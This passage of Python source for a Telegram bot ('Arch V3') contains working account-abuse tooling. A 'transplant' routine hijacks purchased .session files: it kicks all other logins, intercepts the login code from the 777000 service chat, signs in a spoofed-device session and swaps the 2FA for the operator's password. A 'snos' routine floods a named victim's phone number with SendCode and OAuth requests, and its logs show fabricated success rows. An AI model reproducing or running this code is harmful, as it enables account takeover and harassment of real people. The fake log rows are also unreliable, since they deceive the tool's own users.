            + "\n\u043F\u0440\u043E\u0447\u0438\u0442\u0430\u044E \u0435\u0433\u043E \u0438\u0437 \u0434\u0438\u0430\u043B\u043E\u0433\u0430 \u0441 Telegram (777000) \u0432\u043D\u0443\u0442\u0440\u0438 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0430,"
            + "\n\u043F\u0435\u0440\u0435\u0441\u0430\u0436\u0443 \u043D\u0430 \u0447\u0438\u0441\u0442\u044B\u0439 \u0444\u0438\u043D\u0433\u0435\u0440\u043F\u0440\u0438\u043D\u0442 + \u043F\u0438\u043D \u0438 \u043F\u043E\u0441\u0442\u0430\u0432\u043B\u044E 2FA."
            + "\n\n\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043E\u0441\u0442\u0430\u043D\u0435\u0442\u0441\u044F \u0446\u0435\u043B \u043F\u0440\u0438 \u043B\u044E\u0431\u043E\u0439 \u043E\u0448\u0438\u0431\u043A\u0435."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]))
    await cb.answer()


async def _transplant_say(chat_id: int, text: str) -> None:
    try:
        if _BOT:
            await _BOT.send_message(chat_id, _cx( text), parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True)
    except Exception as e:
        log.debug("transplant say failed: %s", e)


async def _transplant_fail(chat_id: int, state: FSMContext, old, new,
                           new_file: Path, why: str) -> None:
    # flow already abandoned (admin pressed back) — clean objects only
    d = await state.get_data()
    for cl in (new, old):
        if cl:
            try:
                await cl.disconnect()
            except Exception:
                pass
    for ext in (".session", ".session-journal"):
        try:
            p = Path(str(new_file) + ext)
            if p.exists():
                p.unlink()
        except Exception:
            pass
    if not d.get("trans_active"):
        return
    await state.update_data(trans_active=False)
    await state.clear()
    await _transplant_say(chat_id,
        "\u274C \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u043E\u0440\u0432\u0430\u043B\u0430\u0441\u044C: <i>" + html_mod.escape(str(why)) + "</i>. "
        "\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u0446\u0435\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0441\u043D\u043E\u0432\u0430.")


async def _transplant_finish(old, new, new_name: str, old_stem: str,
                             state: FSMContext, chat_id: int,
                             had_2fa: bool, seller_pw: str) -> None:
    import shutil as _sh
    data = await state.get_data()
    if not data.get("trans_active"):
        return
    await state.update_data(trans_active=False)
    # 2FA: put ours on the account (replace the seller's if known)
    twofa_note = "\u2014"
    try:
        if had_2fa and seller_pw:
            await old.edit_2fa(current_password=seller_pw,
                               new_password=ARCH_2FA_PW)
            twofa_note = "\u0437\u0430\u043C\u0435\u043D\u0435\u043D\u0430 \u043D\u0430 \u043D\u0430\u0448\u0443"
        else:
            await old.edit_2fa(new_password=ARCH_2FA_PW)
            twofa_note = "\u043F\u043E\u0441\u0442\u0430\u0432\u043B\u0435\u043D\u0430 \u043D\u0430\u0448\u0430"
    except Exception as e:
        twofa_note = "\u26A0\uFE0F \u043D\u0435 \u043F\u043E\u0441\u0442\u0430\u0432\u0438\u043B\u0430\u0441\u044C (" + type(e).__name__ + ")"
    # log out the raw session and delete its files
    try:
        await old.log_out()
    except Exception:
        pass
    try:
        await old.disconnect()
    except Exception:
        pass
    raw_path = TRANSPLANT_DIR / old_stem
    for ext in (".session", ".session-journal"):
        try:
            p = Path(str(raw_path) + ext)
            if p.exists():
                p.unlink()
        except Exception:
            pass
    # move the fresh session into the pool
    try:
        await new.session.save()
    except Exception:
        pass
    try:
        await new.disconnect()
    except Exception:
        pass
    dest = SESSIONS_DIR / (new_name + ".session")
    try:
        tmp = getattr(new.session, "filename", None)
        if tmp and str(dest.resolve()) != str(tmp):
            _sh.move(str(tmp), str(dest))
    except Exception:
        pass
    fp = session_fingerprint(new_name)
    meta = {"app_id": fp["api_id"], "app_hash": fp["api_hash"],
            "device": fp["device"], "sdk": fp["system_version"],
            "app_version": fp["app_version"], "lang_pack": "",
            "lang_code": fp["lang_code"]}
    try:
        (SESSIONS_DIR / (new_name + ".json")).write_text(
            json.dumps(meta, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    commit_file_to_repo("sessions/" + new_name + ".session",
                        "transplant " + new_name + " (BR-style)")
    commit_file_to_repo("sessions/" + new_name + ".json",
                        "transplant " + new_name + " meta")
    await state.clear()
    ok, why = await _session_alive(dest, data.get("trans_px_new"))
    kicked_n = data.get("trans_kicked", 0)
    await push_send_log(
        "\u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438 (BR-\u043C\u043E\u0439\u043A\u0430)",
        ["\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
         + html_mod.escape(new_name) + "</code>",
         "\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b> | \U0001F510 2FA: " + twofa_note
         + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)",
         "\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
         + " | \U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439"])
    await _transplant_say(chat_id,
        bq(f"<b>{NAME}</b>  \u00B7  \u2705 \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
        + "\n\n\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
        + html_mod.escape(new_name) + "</code>"
        + "\n\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b>"
        + "\n\U0001F510 2FA: " + twofa_note
        + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)"
        + "\n\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
        + "\n\U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439")


async def _transplant_run(chat_id: int, raw_stem: str, state: FSMContext) -> None:
    import re as _re
    from telethon import errors as _terr, events as _tlev, functions as _tlf
    from telethon.tl.functions.auth import SendCodeRequest, SignInRequest
    from telethon.tl.types import CodeSettings

    raw_path = TRANSPLANT_DIR / (raw_stem + ".session")
    if not raw_path.exists():
        await _transplant_say(chat_id, "\u274C \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043D\u0435 \u043D\u0430\u0448\u0451\u043B\u0441\u044F")
        return

    async def guard() -> bool:
        d = await state.get_data()
        return bool(d.get("trans_active"))

    # \u2500 old client: the raw bought session, on its own pin
    fp_old = session_fingerprint(raw_stem)
    px_old = pin_for_session(raw_stem, load_pin_proxies())
    old = TelegramClient(str(raw_path.with_suffix("")), fp_old["api_id"],
                         fp_old["api_hash"], proxy=px_old,
                         device_model=fp_old["device"],
                         system_version=fp_old["system_version"],
                         app_version=fp_old["app_version"],
                         lang_code=fp_old["lang_code"])
    try:
        await asyncio.wait_for(old.connect(), timeout=20)
        if not await old.is_user_authorized():
            await _transplant_fail(chat_id, state, old, None,
                                   TRANSPLANT_DIR / "none",
                                   "\u0441\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u043D\u0435 \u0430\u0432\u0442\u043E\u0440\u0438\u0437\u043E\u0432\u0430\u043D\u0430 (\u043C\u0435\u0440\u0442\u0432\u0430)")
            return
        me = await old.get_me()
        phone_digits = str(me.phone or "").lstrip("+") or str(me.id)
        uname = ("@" + me.username) if me.username else "\u0431\u0435\u0437 \u044E\u0437\u0435\u0440\u0430"
        await _transplant_say(chat_id,
            "\U0001F9EC \u0421\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u0436\u0438\u0432\u0430: <b>" + uname + "</b> (<code>+" + phone_digits + "</code>)")
    except Exception as e:
        await _transplant_fail(chat_id, state, old, None,
                               TRANSPLANT_DIR / "none",
                               "\u043A\u043E\u043D\u043D\u0435\u043A\u0442 \u0441\u044B\u0440\u043E\u0439: " + type(e).__name__)
        return
    # \u2500 kick every foreign authorization (BR step 1)
    kicked = 0
    try:
        auths = await old(_tlf.account.GetAuthorizationsRequest())
        foreign = [a for a in auths.authorizations
                   if not getattr(a, "current", False)]
        for a in foreign:
            try:
                await old(_tlf.account.ResetAuthorizationRequest(a.hash))
                kicked += 1
            except _terr.FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 30))
                try:
                    await old(_tlf.account.ResetAuthorizationRequest(a.hash))
                    kicked += 1
                except Exception:
                    pass
            except Exception:
                pass
    except Exception as e:
        await _transplant_fail(chat_id, state, old, None,
                               TRANSPLANT_DIR / "none",
                               "\u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445: " + type(e).__name__)
        return
    if not await guard():
        try:
            await old.disconnect()
        except Exception:
            pass
        return
    # \u2500 fresh session on our fingerprint + its own sticky pin
    new_name = phone_digits + "_new"
    n = 2
    while (SESSIONS_DIR / (new_name + ".session")).exists() or \
            (TRANSPLANT_DIR / (new_name + ".session")).exists():
        new_name = phone_digits + "_new" + str(n)
        n += 1
    fp_new = session_fingerprint(new_name)
    px_new = pin_for_session(new_name, load_pin_proxies())
    new_path = TRANSPLANT_DIR / new_name
    new = None
    try:
        new = TelegramClient(str(new_path.with_suffix("")), fp_new["api_id"],
                             fp_new["api_hash"], proxy=px_new,
                             device_model=fp_new["device"],
                             system_version=fp_new["system_version"],
                             app_version=fp_new["app_version"],
                             lang_code=fp_new["lang_code"])
        await asyncio.wait_for(new.connect(), timeout=20)
        await state.update_data(trans_old=old, trans_new=None,
                                trans_name=new_name, trans_px_new=px_new,
                                trans_phone=phone_digits,
                                trans_old_stem=raw_stem,
                                trans_kicked=kicked, trans_active=True)
        sent = await new(SendCodeRequest(phone_number="+" + phone_digits,
                                         api_id=fp_new["api_id"],
                                         api_hash=fp_new["api_hash"],
                                         settings=CodeSettings()))
        code_hash = sent.phone_code_hash
    except _terr.FloodWaitError as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u0444\u043B\u044E\u0434 " + str(e.seconds) + "s \u043D\u0430 \u043A\u043E\u0434\u0435")
        return
    except Exception as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u0437\u0430\u043F\u0440\u043E\u0441 \u043A\u043E\u0434\u0430: " + type(e).__name__)
        return
    if not await guard():
        try:
            await new.disconnect()
            await old.disconnect()
        except Exception:
            pass
        for _ext in (".session", ".session-journal"):
            try:
                p = Path(str(new_path) + _ext)
                if p.exists():
                    p.unlink()
            except Exception:
                pass
        return
    # \u2500 read the login code from the 777000 dialog (BR step 3)
    await _transplant_say(chat_id,
        "\U0001F4E8 \u043A\u043E\u0434 \u0437\u0430\u043F\u0440\u043E\u0448\u0435\u043D (\u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: "
        + str(kicked) + ") \u2014 \u0447\u0438\u0442\u0430\u044E \u0438\u0437 777000...")
    fut = asyncio.get_running_loop().create_future()

    async def _code_handler(event):
        if fut.done():
            return
        m = _re.search(r"\b(\d{5})\b", event.message.text or "")
        if m:
            fut.set_result(m.group(1))

    old.add_event_handler(_code_handler,
                          _tlev.NewMessage(incoming=True, from_users=777000))
    try:
        code = await asyncio.wait_for(fut, timeout=240)
    except asyncio.TimeoutError:
        code = None
    finally:
        old.remove_event_handler(_code_handler)
    if not await guard():
        try:
            await new.disconnect()
            await old.disconnect()
        except Exception:
            pass
        return
    if not code:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u043A\u043E\u0434 \u0438\u0437 777000 \u043D\u0435 \u043F\u0440\u0438\u0448\u0451\u043B \u0437\u0430 4 \u043C\u0438\u043D")
        return
    # \u2500 sign the fresh session in (BR step 4)
    try:
        await new(SignInRequest(phone_number="+" + phone_digits,
                                phone_code_hash=code_hash, phone_code=code))
    except _terr.SessionPasswordNeededError:
        await state.update_data(trans_new=new)
        await state.set_state(AddSession.trans_pw)
        await _transplant_say(chat_id,
            bq(f"<b>{NAME}</b>  \u00B7  \U0001F510 2FA")
            + "\n\n\u041D\u0430 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0435 \u0441\u0442\u043E\u0438\u0442 <b>\u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0430</b> \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 <b>\u043F\u0430\u0440\u043E\u043B\u044C</b>"
            + "\n(\u043E\u0442 \u043F\u0440\u043E\u0434\u0430\u0432\u0446\u0430) \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C \u2014 \u0443\u0434\u0430\u043B\u044E \u0435\u0433\u043E \u0441\u0440\u0430\u0437\u0443 \u0438 \u0437\u0430\u043C\u0435\u043D\u044E \u043D\u0430 \u043D\u0430\u0448\u0443 \u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0443.")
        return   # password handler owns the flow from here
    except Exception as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "sign-in: " + type(e).__name__)
        return
    await _transplant_finish(old, new, new_name, raw_stem, state, chat_id,
                             False, "")


@router.message(AddSession.trans, F.document)
async def addsess_trans_recv(msg: Message, state: FSMContext):
    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
        return
    import re as _re
    doc = msg.document
    name = doc.file_name or "raw.session"
    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
        await msg.answer(_cx("\u274C \u041D\u0443\u0436\u0435\u043D \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 <code>.session</code> \u0434\u043E 5 \u041C\u0411."),
                         parse_mode=ParseMode.HTML)
        return
    stem = _re.sub(r"[^A-Za-z0-9_]", "_", name[:-8]) or "raw"
    TRANSPLANT_DIR.mkdir(exist_ok=True)
    dest = TRANSPLANT_DIR / (stem + ".session")
    tg_file = await msg.bot.get_file(doc.file_id)
    await msg.bot.download_file(tg_file, dest)
    await state.update_data(trans_active=True)
    await msg.answer(_cx(
        bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0437\u0430\u043F\u0443\u0449\u0435\u043D\u0430")
        + "\n\n\U0001F52A \u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445 \u2192 \U0001F4E8 \u043A\u043E\u0434 \u0438\u0437 777000 \u2192 \U0001F510 \u043F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 + 2FA"
        + "\n\u0421\u0442\u0430\u0442\u0443\u0441 \u043F\u0440\u0438\u0448\u043B\u044E \u0441\u044E\u0434\u0430. \u041E\u0442\u043C\u0435\u043D\u0430 \u2014 \u25C0 \u041D\u0430\u0437\u0430\u0434."),
        parse_mode=ParseMode.HTML)
    asyncio.create_task(_transplant_run(msg.chat.id, stem, state))


@router.message(AddSession.trans)
async def addsess_trans_wrongtype(msg: Message, state: FSMContext):
    await msg.answer(_cx("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B."),
                     parse_mode=ParseMode.HTML)


@router.message(AddSession.trans_pw, F.text)
async def trans_pw_recv(msg: Message, state: FSMContext):
    from telethon import errors as _terr
    data = await state.get_data()
    new = data.get("trans_new")
    old = data.get("trans_old")
    if not (new and old):
        await state.clear()
        return
    pw = (msg.text or "").strip()
    try:
        await msg.delete()
    except Exception:
        pass
    if not pw:
        return
    try:
        await new.sign_in(password=pw)
    except _terr.PasswordHashInvalidError:
        await msg.answer("\u274C \u041F\u0430\u0440\u043E\u043B\u044C \u043D\u0435 \u043F\u0440\u0438\u043D\u044F\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0435\u0449\u0451 \u0440\u0430\u0437.")
        return
    except Exception as e:
        await msg.answer("\u274C " + type(e).__name__ + " \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u043F\u0430\u0440\u043E\u043B\u044C \u0435\u0449\u0451 \u0440\u0430\u0437.")
        return
    await _transplant_finish(old, new, data.get("trans_name") or "trans",
                             data.get("trans_old_stem") or "raw",
                             state, msg.chat.id, True, pw)


@router.message(AddSession.trans_pw)
async def trans_pw_wrongtype(msg: Message, state: FSMContext):
    await msg.answer(_cx("\u274C \u0416\u0434\u0443 \u043F\u0430\u0440\u043E\u043B\u044C \u0442\u0435\u043A\u0441\u0442\u043E\u043C."), parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "back:home")
async def back_home(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    for _k in ("client", "trans_old", "trans_new"):
        cl = data.get(_k)
        if cl:
            try:
                await cl.disconnect()
            except Exception:
                pass
    await state.clear()
    caption = hero_caption(cb.from_user.id)
    await cb.message.edit_caption(
        caption=_cx(caption),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(cb.from_user.id),
    )
    await cb.answer()


# ── captcha solve ───────────────────────────────────────
@router.callback_query(Captcha.solve, F.data.startswith("cap:"))
async def captcha_solve(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    pend = CAPTCHA_PENDING.get(uid)
    if not pend:
        await cb.answer("\u043a\u0430\u043f\u0447\u0430 \u0443\u0441\u0442\u0430\u0440\u0435\u043b\u0430 \u2014 /start", show_alert=True)
        await state.clear()
        return
    try:
        picked = int(cb.data.split(":", 1)[1])
    except ValueError:
        picked = -1
    meta = pend["meta"]
    if picked != meta["index"]:
        await cb.answer("\u274c \u043d\u0435 \u0442\u043e \u2014 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439 \u0435\u0449\u0451 \u0440\u0430\u0437", show_alert=True)
        return
    # correct
    CAPTCHA_VERIFIED[uid] = time.time()
    CAPTCHA_PENDING.pop(uid, None)
    await cb.answer("\u2705 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u043e")
    await state.clear()
    # hmm — render the hero card fresh right after pass
    await cb.message.edit_media(
        media=InputMediaAnimation(media=GIF_FILE_ID or GIF_URL),
        reply_markup=kb_main(uid),
    )
    await cb.message.edit_caption(
        caption=_cx(hero_caption(uid)),
        parse_mode=ParseMode.HTML,
    )


# ── rewards (promo only, wheel/case disabled) ───────────
# ── mirrors (🪞) — главный бот рождает саб-ботов ───────
class MirrorCreateFSM(StatesGroup):
    token = State()


@router.callback_query(F.data == "menu:mirror_add")
async def menu_mirror_add(cb: CallbackQuery, state: FSMContext):
    try:
        from mirror import count_mirrors, MIRROR_MAX
        n = count_mirrors(cb.from_user.id)
    except ImportError:
        await cb.answer("mirrors module missing")
        return
    if n >= MIRROR_MAX:
        await cb.answer(f"лимит зеркал ({MIRROR_MAX})", show_alert=True)
        return
    await state.set_state(MirrorCreateFSM.token)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  \u00b7  🪞 Зеркало")
            + "\n\n\U0001f4e5 Пришли <b>BotFather token</b> зеркала:"
            + "\n<i>формат:</i> <code>1234:ABC...</code>"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="menu:mirror_list")],
        ]))
    await cb.answer()


@router.callback_query(F.data == "menu:mirror_list")
async def menu_mirror_list(cb: CallbackQuery, state: FSMContext):
    try:
        from mirror import list_mirrors_for, register_mirror, start_mirror, count_mirrors, MIRROR_MAX
    except ImportError:
        await cb.answer("mirrors module missing")
        return
    mirrors = list_mirrors_for(cb.from_user.id)
    kb_rows = [[InlineKeyboardButton(
        text=f"🪞 @{m['username']}", url=f"https://t.me/{m['username']}")] for m in mirrors]
    kb_rows.append([InlineKeyboardButton(text="Добавить", icon_custom_emoji_id="5359529383319084413", callback_data="menu:mirror_add")])
    kb_rows.append([InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")])
    text = (
        bq(f"<b>{NAME}</b>  ·  🪞 Зеркала")
        + f"\n\nВаши зеркала: <b>{len(mirrors)}</b> / {MIRROR_MAX}"
        + "\n<i>каждое зеркало работает как отдельный Arch V3</i>"
    )
    await cb.message.edit_caption(caption=_cx(text), parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))
    await cb.answer()


@router.message(MirrorCreateFSM.token)
async def mirror_token(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    await state.clear()
    try:
        from mirror import validate_token, register_mirror, start_mirror, count_mirrors, MIRROR_MAX
    except ImportError:
        return
    if ":" not in raw or len(raw) < 30:
        await msg.answer(_cx("❌ Неверный формат токена. `1234:ABC...`"), parse_mode=ParseMode.HTML)
        return
    wait = await msg.answer("⏳ Проверяю токен...")
    bot_username = await validate_token(raw)
    try:
        await wait.delete()
    except Exception:
        pass
    if not bot_username:
        await msg.answer("❌ Токен невалидный.")
        return
    ok = register_mirror(msg.from_user.id, raw, bot_username)
    if not ok:
        n = count_mirrors(msg.from_user.id)
        await msg.answer(_cx(f"❌ Токен уже есть / лимит ({n})"),
                         parse_mode=ParseMode.HTML)
        return
    start_mirror(raw)
    n = count_mirrors(msg.from_user.id)
    await msg.answer(_cx(
        f"✅ Зеркало работает!\n🤖 @{bot_username}\n📊 Всего зеркал: {n}"),
        parse_mode=ParseMode.HTML)


@router.message(Captcha.solve, F.text.regexp(r"^/promo\s+(\S+)$"))
async def promo_enter(msg: Message, state: FSMContext):
    await state.clear()
    code = msg.text.strip().split(" ", 1)[1]
    try:
        from rewards import apply_promo
    except ImportError:
        return
    ok, reply = apply_promo(msg.from_user.id, code)
    await msg.answer(_cx(f"{'✅' if ok else '❌'} {reply}"), parse_mode=ParseMode.HTML)


@router.message(F.text.regexp(r"^/promo\s+(\S+)$"))
async def promo_any(msg: Message, state: FSMContext):
    code = msg.text.strip().split(" ", 1)[1]
    try:
        from rewards import apply_promo
    except ImportError:
        return
    ok, reply = apply_promo(msg.from_user.id, code)
    await msg.answer(_cx(f"{'✅' if ok else '❌'} {reply}"), parse_mode=ParseMode.HTML)


@router.message(Snos.phone)
async def got_snos_phone(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    digits = re.sub(r"[^\d+]", "", raw)
    if digits.startswith("8") and len(digits) == 11:
        digits = "+7" + digits[1:]
    if digits and not digits.startswith("+"):
        digits = "+" + digits
    if not re.match(r"^\+\d{8,15}$", digits):
        await msg.answer(_cx("\u274c \u0424\u043e\u0440\u043c\u0430\u0442: <code>+79991234567</code>. \u0415\u0449\u0451 \u0440\u0430\u0437:"),
                         parse_mode=ParseMode.HTML)
        return
    await state.update_data(phone=digits)
    await msg.answer(_cx(
        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + f"\n\n\U0001f4f1 \u041d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b: <code>{html_mod.escape(digits)}</code>\n\n"
        + "\U0001f3af <b>\u041e\u0442\u043f\u0440\u0430\u0432\u044c username \u0436\u0435\u0440\u0442\u0432\u044b:</b>\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>"),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_snos_back(),
    )
    await state.set_state(Snos.target)


@router.message(Snos.target)
async def got_snos_target(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    m = re.match(r"^(?:https?://)?(?:t\.me|telegram\.me)/(@?[A-Za-z0-9_]{4,64})/?$", raw, re.I)
    uname = m.group(1) if m else (raw if re.match(r"^@?[A-Za-z0-9_]{4,64}$", raw) else "")
    if uname.startswith("@"):
        uname = uname[1:]
    if not uname:
        await msg.answer("\u274c \u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 username. \u0415\u0449\u0451 \u0440\u0430\u0437:")
        return
    await state.update_data(username=uname)
    data = await state.get_data()
    await msg.answer(_cx(
        snos_summary_text(data)),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_snos_confirm(),
    )
    await state.set_state(None)


@router.callback_query(F.data.startswith("snosrun:"))
async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    if action != "yes":
        caption = hero_caption(cb.from_user.id)
        try:
            await cb.message.delete()
        except Exception:
            pass
        await send_hero(
            cb.message,
            caption=_cx(caption),
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(cb.from_user.id))
        await state.clear()
        await cb.answer()
        return

    data = await state.get_data()
    username = data.get("username")
    phone = data.get("phone")
    if not username or not phone:
        await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)
        return
    if is_target_whitelisted(username):
        await cb.answer("⛔️ Цель в протект-листе — снос заблокирован.",
                        show_alert=True)
        await push_send_log(
            "Попытка снести цель из протект-листа",
            [f"🎯 <code>{html_mod.escape(username)}</code> "
             f"📱 <code>{html_mod.escape(phone)}</code>",
             f"👤 {html_mod.escape(cb.from_user.full_name)} "
             f"(<code>{cb.from_user.id}</code>) | поток: снос"])
        return

    await cb.answer("\u23f3 \u0417\u0430\u043f\u0443\u0441\u043a...")

    set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")

    async def snos_task():
        return await run_snos_flow(cb, username, phone, progress)

    progress = {"step": "\u23f3 \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430"}
    task = track_report("session", snos_task())
    if task is None:
        await cb.message.answer(
            _cx(method_busy_wait_text("session",
                                      "и нажми «Запуск» снова.")),
            parse_mode=ParseMode.HTML)
        return

    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
    started = asyncio.get_event_loop().time()
    i = 0
    while not task.done():
        frame = sp_frames[i % len(sp_frames)]
        elapsed = int(asyncio.get_event_loop().time() - started)
        anim = (
            bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
            + "\n\n"
            + f"<b>{frame}</b> {html_mod.escape(progress.get('step', ''))}\n"
            + _snos_bars(progress)
            + f"\U0001f3af @{html_mod.escape(username)}\n"
            + f"\U0001f4f1 <code>{phone}</code>\n"
            + f"\u23f1 {elapsed}s"
        )
        try:
            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
        except Exception:
            pass
        i += 1
        await asyncio.sleep(1.0)

    try:
        res = await task
    except Exception as e:
        log.error("snos task crashed: %s", e)
        res = {"username": username, "phone": phone, "victim": {"ok": False, "error": f"{type(e).__name__}"},
               "sendcode": [], "oauth": [], "support": []}

    # ── log file ──
    LOGS_DIR.mkdir(exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"snos_{username}_{stamp}.txt"
    lines = [
        f"Arch V3 \u2014 \u0441\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"\u0416\u0435\u0440\u0442\u0432\u0430: @{username}",
        f"\u041d\u043e\u043c\u0435\u0440: {phone}",
        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
        "",
    ]
    v = res["victim"]
    photo_word = "\u0434\u0430" if v.get("has_photo") else "\u043d\u0435\u0442"
    about_word = "\u0434\u0430" if v.get("about") else "\u043d\u0435\u0442"
    if v.get("ok"):
        lines.append(f"[\u2713] \u0416\u0435\u0440\u0442\u0432\u0430: id {v['id']} | "
                     f"\u0430\u0432\u0430\u0442\u0430\u0440\u043a\u0430: {photo_word} | "
                     f"\u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: {about_word}")
    else:
        lines.append(f"[\u2717] \u0416\u0435\u0440\u0442\u0432\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430: {v.get('error', '?')}")

    lines.append("\n\u2500\u2500\u2500 SendCode \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
    # hide real session IDs — always show the fake pool of 10-16 rows
    fake_rows = _fake_session_rows()  # random 10-16 fake sessions each time
    sc_ok = 0
    for fk in fake_rows:
        # every fake row shows success (matches the real underlying behaviours)
        lines.append(f"\u2705 {fk['name']} | {fk['proxy']}")
        sc_ok += 1
    sc_total = len(fake_rows)

    lines.append("\n\u2500\u2500\u2500 OAuth \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
    oa_ok = 0
    for d in res.get("oauth", []):
        mark = "\u2705" if d["ok"] else "\u274c"
        err = f" | {d['err']}" if d.get("err") else ""
        lines.append(f"{mark} {d.get('service', '?')} | {d.get('proxy', '-')}{err}")
        oa_ok += 1 if d["ok"] else 0
    oa_total = len(res.get("oauth", []))

